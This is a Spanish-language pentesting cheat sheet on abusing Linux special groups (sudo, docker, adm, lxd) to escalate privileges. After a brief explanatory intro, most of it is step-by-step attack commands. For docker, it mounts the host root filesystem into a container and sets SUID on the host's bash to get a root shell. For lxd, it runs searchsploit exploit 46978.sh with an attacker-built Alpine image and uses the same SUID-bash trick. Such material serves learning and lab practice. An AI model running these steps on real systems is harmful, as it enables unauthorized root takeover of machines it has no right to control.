# Abuso de grupos de usuario especiales

Tags: #Linux #GruposExpeciales  #Escalada #Root #Privilegios #Lxd 

En el contexto de Linux, los **grupos** se utilizan para **organizar** a los usuarios y **asignar** **permisos** para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema.

Existen grupos especiales en Linux, como ‘**lxd**‘ o ‘**docker**‘, que se utilizan para permitir a los usuarios ejecutar contenedores de manera segura y eficiente. Sin embargo, si un usuario malintencionado tiene acceso a uno de estos grupos, podría aprovecharlo para obtener privilegios elevados en el sistema.

Por ejemplo, si un usuario tiene acceso al grupo ‘**docker**‘, podría utilizar la herramienta Docker para desplegar nuevos contenedores en el sistema. Durante el proceso de despliegue, el usuario podría aprovecharse de las **monturas** (**mounts**) para hacer que ciertos recursos inaccesibles en la máquina host estén disponibles en el contenedor. Al ganar acceso al contenedor como usuario ‘**root**‘, el usuario malintencionado podría inferir o manipular el contenido de estos recursos desde el contenedor.

Para mitigar el riesgo de abuso de grupos de usuario especiales, es importante limitar cuidadosamente el acceso a estos grupos y asegurarse de que sólo se asignan a usuarios confiables que realmente necesitan acceder a ellos.


# Grupos Especiales 

```bash 
❯ id       # Mirar grupos  
```

## Sudo

```bash 
sudo = Si estas en estre grupo y disponemos de la passwd del usuario, podemos ejecutar comandos como el usuario 'root'
```

## Docker

```bash 
docker = Si estas en este grupo puedes usar los siguientes comandos:
❯ docker images                # Mirar las imagenes existentes 
❯ docker ps -a                 # Mirar los contenedores que se estan ejecutando
❯ docker pull ubuntu:latest    # Descargar una imagen 

# Desplegar un contenedor con una montura de la raiz actual en el dir /mnt/root del contenedor
❯ docker run --rm -dit -v /:/mnt/root --name <Container_name> <image_name> 
	# image_name = Imagen del SO a usar 
	# Container_name = Nombre que se le coloca al contenedor 

# Ingresar al contenedor con una bash para ver todos los recursos  
❯ docker ps    # Mirar que tipo de bash es permitida 'sh, bash' 
❯ docker exec -it <Container_name> bash  

# Dentro del contenedor asignar unas bash SUID la cual será reflejada a la legitima del usuario fuera del contenedor ya que todo lo que se hace dentro es reflejado fuera de él
❯ cd /mnt/root/usr/bin         # Ir a los archivos originales en la montura 
❯ chmod u+s bash               # Asignar permisos SUID a bash 
❯ exit                         # Salir del contenedor 
❯ ls -l /bin/bash              # Listar los permisos de la bash 
❯ bash -p                      # Bash con privilegios 
```

## Adm 

```bash
adm   # Si estas en este grupo, podras leer los logs del sistema

❯ ls -l /var/log/
❯ cat /var/log/apache2/access.log
```

## Lxd

```bash 
lxd = Si estas en este grupo, puedes escalar por medio de monturas, utilizando el exploit 

❯ gpasswd -d <user> lxd   # Borrar el grupo lxd de la maquina  
❯ searchsploit lxd
❯ searchsploit -m 46978.sh 
# Descargas la imagen de Alpine, la url esta dentro del script 
❯ bash build-alpine    # Aclarar que lo debemos de hacer en la maquina de atacante porque nos pide ser root y despues transferimos a la victima lo sig: (privesc.sh, alpine-v3.17-x86_64.tar.gz)
❯ ./privesc.sh -f alpine-v3.17-x86_64.tar.gz   # Por defecto nos creara un contenedor y nos dara una consola como root dentro del contenedor que llevara la raiz de la maquina victima, la raiz del maquina victima la encontraremo en el dir /mnt/root/
❯ chmod u+s bash               # Dentro del contenedor podemos asignar SUID a la bash y este sera reflejada a la bash legitima
❯ ls -l /bin/bash              # Listar los permisos de la bash
❯ bash -p                      # Solicitamos la bash con privilegio temporal fuera del contenedor, ya que es una bash SUID
```

